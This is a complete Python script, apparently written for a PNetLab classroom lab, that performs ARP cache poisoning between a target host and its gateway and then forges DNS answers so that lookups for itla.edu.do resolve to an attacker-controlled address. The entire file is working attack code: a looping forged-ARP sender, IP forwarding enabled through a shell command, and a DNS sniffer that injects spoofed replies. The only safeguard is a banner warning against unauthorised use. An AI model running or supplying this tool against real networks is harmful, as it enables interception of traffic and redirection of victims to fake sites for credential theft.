#!/usr/bin/env python3
"""
MitM Lab Tool - PNetLab
ARP Poisoning + DNS Hijacking
ENTORNO CONTROLADO - USO NO AUTORIZADO ES ILEGAL
"""

from scapy.all import ARP, Ether, DNS, DNSRR, IP, UDP, srp, send, sendp, sniff
import threading
import time
import os
import sys

# ─────────────────────────────────────────
#   COLORES
# ─────────────────────────────────────────
R  = '\033[91m'
G  = '\033[92m'
Y  = '\033[93m'
B  = '\033[94m'
C  = '\033[96m'
W  = '\033[97m'
RST= '\033[0m'
BO = '\033[1m'

# ─────────────────────────────────────────
#   CONFIGURACION DE RED
# ─────────────────────────────────────────
NIC         = "eth1"
HOST_TARGET = "12.0.10.20"
HOST_GW     = "12.0.10.1"
HOST_FAKE   = "12.0.10.10"

DOMINIOS_OBJETIVO = ["itla.edu.do.", "www.itla.edu.do."]

# ─────────────────────────────────────────
#   HELPERS VISUALES
# ─────────────────────────────────────────
def log_ok(msg):   print(f"  {G}+{RST}  {msg}")
def log_warn(msg): print(f"  {Y}!{RST}  {msg}")
def log_dns(msg):  print(f"  {C}@{RST}  {msg}")
def log_hit(msg):  print(f"  {R}>>{RST}  {BO}{msg}{RST}")


# ─────────────────────────────────────────
#   RESOLUCION MAC
# ─────────────────────────────────────────
def resolver_mac(host):
    req    = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=host)
    result = srp(req, iface=NIC, timeout=3, verbose=False)[0]
    if not result:
        log_warn(f"Sin respuesta ARP de {host}")
        sys.exit(1)
    return result[0][1].hwsrc


# ────────────────────────────────────���────
#   ARP POISONING
# ─────────────────────────────────────────
def envenenar_arp(target, gateway):
    mac_target = resolver_mac(target)
    mac_gw     = resolver_mac(gateway)

    log_ok(f"MAC target   {C}{mac_target}{RST}")
    log_ok(f"MAC gateway  {C}{mac_gw}{RST}")

    pkt_a_target = Ether(dst=mac_target) / ARP(op=2, pdst=target,  hwdst=mac_target, psrc=gateway)
    pkt_a_gw     = Ether(dst=mac_gw)     / ARP(op=2, pdst=gateway, hwdst=mac_gw,     psrc=target)

    while True:
        sendp(pkt_a_target, iface=NIC, verbose=False)
        sendp(pkt_a_gw,     iface=NIC, verbose=False)
        time.sleep(2)


# ─────────────────────────────────────────
#   DNS HIJACKING
# ─────────────────────────────────────────
def interceptar_dns(paquete):
    if not (paquete.haslayer(DNS) and paquete[DNS].qr == 0):
        return

    nombre = paquete[DNS].qd.qname.decode()
    origen = paquete[IP].src

    if nombre not in DOMINIOS_OBJETIVO:
        return

    log_dns(f"{origen}  >>  {nombre}")

    forjado = (
        IP(src=paquete[IP].dst, dst=origen)
        / UDP(sport=paquete[UDP].dport, dport=paquete[UDP].sport)
        / DNS(
            id=paquete[DNS].id,
            qr=1, aa=1, rd=1, ra=1,
            qd=paquete[DNS].qd,
            an=DNSRR(
                rrname=paquete[DNS].qd.qname,
                type="A",
                ttl=300,
                rdata=HOST_FAKE
            )
        )
    )

    send(forjado, iface=NIC, verbose=False)
    log_hit(f"HIJACKED  {nombre.strip('.')}  >>  {HOST_FAKE}")


# ─────────────────────────────────────────
#   ENTRY POINT
# ─────────────────────────────────────────
def main():
    os.system("clear")
    print(f"\n  {BO}{B}[ ARP + DNS HIJACK ]{RST}  {W}PNetLab Edition{RST}\n")
    print(f"  {W}{'─'*38}{RST}")
    print(f"  {W}NIC      {RST}  {C}{NIC}{RST}")
    print(f"  {W}Target   {RST}  {R}{HOST_TARGET}{RST}")
    print(f"  {W}Gateway  {RST}  {Y}{HOST_GW}{RST}")
    print(f"  {W}Redirect {RST}  {G}{HOST_FAKE}{RST}")
    print(f"  {W}Dominio  {RST}  {C}{', '.join(DOMINIOS_OBJETIVO)}{RST}")
    print(f"  {W}{'─'*38}{RST}\n")

    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    log_ok("IP Forwarding ON")

    hilo_arp = threading.Thread(
        target=envenenar_arp,
        args=(HOST_TARGET, HOST_GW),
        daemon=True
    )
    hilo_arp.start()
    log_ok("ARP Poisoning activo")
    log_warn("Escuchando DNS...\n")

    sniff(
        iface=NIC,
        filter="udp port 53",
        prn=interceptar_dns,
        store=False
    )


if __name__ == "__main__":
    main()